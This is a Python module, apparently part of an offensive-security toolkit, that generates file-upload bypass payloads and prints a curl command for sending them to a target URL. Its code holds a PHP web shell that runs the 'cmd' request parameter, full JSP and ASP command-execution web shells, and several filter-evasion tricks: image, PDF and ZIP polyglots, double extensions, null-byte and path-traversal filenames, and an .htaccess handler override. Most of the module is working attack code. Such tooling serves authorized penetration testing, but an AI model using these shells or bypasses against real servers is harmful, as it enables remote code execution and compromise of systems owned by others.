"""Helpers for crafting file upload bypass payloads."""

from __future__ import annotations

import io
import secrets
from pathlib import Path
from typing import Callable, Dict, Tuple

from ..base import ToolResult
from ...data_paths import user_cache_dir

DEFAULT_PAYLOAD = "<?php echo shell_exec($_GET['cmd'] ?? 'id'); ?>"


class FileUploadTester:
    name = "File Upload Tester"
    description = "Generate bypass payloads and multipart helpers for upload endpoints."
    category = "Web"

    def run(
        self,
        variant: str = "polyglot_png_php",
        payload: str = DEFAULT_PAYLOAD,
        base_name: str = "shell",
        mime_type: str = "image/png",
        field_name: str = "file",
        target: str = "http://localhost/upload",
        action: str = "generate",
    ) -> ToolResult:
        workspace = _ensure_workspace()
        if action == "list":
            listing = _list_existing(workspace)
            return ToolResult(title="Upload tester files", body=listing)
        if action == "cleanup":
            removed = _cleanup_workspace(workspace)
            return ToolResult(title="Upload tester cleanup", body=f"Removed {removed} generated files.")

        variant = variant or "polyglot_png_php"
        generator = VARIANTS.get(variant)
        if generator is None:
            raise ValueError(f"Unknown variant: {variant}")

        filename, recommended_mime, data = generator(payload, base_name)
        if mime_type.strip():
            recommended_mime = mime_type.strip()
        output = workspace / filename
        output.write_bytes(data)

        curl_cmd = f"curl -X POST {target} -F \"{field_name}=@{output};type={recommended_mime}\""
        lines = [
            f"Generated file: {output}",
            f"Size: {output.stat().st_size} bytes",
            f"Suggested MIME type: {recommended_mime}",
            "",
            "Sample curl command:",
            curl_cmd,
            "",
            "Notes:",
            "- Adjust the curl URL and field name to match the target form.",
            "- Combine with HTTP parameter pollution or path traversal as needed.",
        ]
        return ToolResult(title="File upload helper", body="\n".join(lines))


def _ensure_workspace() -> Path:
    path = user_cache_dir() / "upload-tests"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _list_existing(workspace: Path) -> str:
    files = sorted(workspace.glob("*"))
    if not files:
        return "No generated files yet. Use action=generate to create one."
    lines = ["Existing generated files:"]
    for file in files:
        lines.append(f"- {file.name} ({file.stat().st_size} bytes)")
    return "\n".join(lines)


def _cleanup_workspace(workspace: Path) -> int:
    count = 0
    for file in workspace.glob("*"):
        try:
            file.unlink()
            count += 1
        except OSError:
            pass
    return count


def _variant_polyglot_png(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    png_stub = bytes.fromhex(
        "89504E470D0A1A0A0000000D4948445200000001000000010802000000907753DE0000000C49444154789C63600000020001E221BC330000000049454E44AE426082"
    )
    payload_body = payload.strip().replace("<?php", "").replace("?>", "").strip()
    comment_chunk = f"<?php {payload_body} ?>".encode()
    combined = png_stub + b"\n" + comment_chunk
    filename = f"{base_name}.php.png"
    return filename, "image/png", combined


def _variant_polyglot_zip(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    buffer = io.BytesIO()
    import zipfile

    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(f"{base_name}.php", payload)
    filename = f"{base_name}.php.zip"
    return filename, "application/zip", buffer.getvalue()


def _variant_double_extension(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    filename = f"{base_name}.php.jpg"
    content = b"\xff\xd8\xff\xe0" + payload.encode()
    return filename, "image/jpeg", content


def _variant_htaccess_shell(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    filename = ".htaccess"
    body = f"AddType application/x-httpd-php .{base_name}\n".encode()
    return filename, "text/plain", body


def _variant_content_type_confusion(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    boundary = secrets.token_hex(8)
    multipart = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"note\"\r\n\r\nTest upload\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{base_name}.php\"\r\n"
        f"Content-Type: application/json\r\n\r\n"
        f"{payload}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    filename = f"{base_name}-multipart.txt"
    return filename, "multipart/form-data; boundary=" + boundary, multipart


def _variant_null_byte(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    filename = f"{base_name}.php%00.jpg"
    content = b"\xff\xd8\xff\xe0" + payload.encode()
    return filename, "image/jpeg", content


def _variant_case_variation(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    filename = f"{base_name}.PhP"
    return filename, "application/x-php", payload.encode()


def _variant_path_traversal(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    filename = f"../../../{base_name}.php"
    return filename, "application/x-php", payload.encode()


def _variant_gif_polyglot(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    gif_header = b"GIF89a"
    php_payload = f"<?php {payload} ?>".encode()
    combined = gif_header + php_payload
    filename = f"{base_name}.gif.php"
    return filename, "image/gif", combined


def _variant_pdf_polyglot(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    pdf_header = b"%PDF-1.4"
    php_payload = f"\n<?php {payload} ?>\n".encode()
    combined = pdf_header + php_payload
    filename = f"{base_name}.pdf.php"
    return filename, "application/pdf", combined


def _variant_svg_payload(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    svg_content = f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>{payload}</script></svg>'
    filename = f"{base_name}.svg"
    return filename, "image/svg+xml", svg_content.encode()


def _variant_jsp_webshell(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    jsp_shell = f'''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {{
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {{
        out.println(line);
    }}
}}
%>'''
    filename = f"{base_name}.jsp"
    return filename, "application/x-jsp", jsp_shell.encode()


def _variant_asp_webshell(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    asp_shell = f'''<%
Dim cmd
cmd = Request("cmd")
Set shell = CreateObject("WScript.Shell")
Set exec = shell.Exec(cmd)
Response.Write(exec.StdOut.ReadAll)
%>'''
    filename = f"{base_name}.asp"
    return filename, "application/x-asp", asp_shell.encode()


def _variant_magic_bytes_php(payload: str, base_name: str) -> Tuple[str, str, bytes]:
    # PNG magic bytes followed by PHP code
    png_header = bytes.fromhex("89504E470D0A1A0A")
    php_code = f"<?php {payload} ?>".encode()
    combined = png_header + php_code
    filename = f"{base_name}.png"
    return filename, "image/png", combined


VARIANTS: Dict[str, Callable[[str, str], Tuple[str, str, bytes]]] = {
    "polyglot_png_php": _variant_polyglot_png,
    "polyglot_zip_php": _variant_polyglot_zip,
    "double_extension": _variant_double_extension,
    "htaccess": _variant_htaccess_shell,
    "multipart_confusion": _variant_content_type_confusion,
    "null_byte": _variant_null_byte,
    "case_variation": _variant_case_variation,
    "path_traversal": _variant_path_traversal,
    "gif_polyglot": _variant_gif_polyglot,
    "pdf_polyglot": _variant_pdf_polyglot,
    "svg_payload": _variant_svg_payload,
    "jsp_webshell": _variant_jsp_webshell,
    "asp_webshell": _variant_asp_webshell,
    "magic_bytes_php": _variant_magic_bytes_php,
}
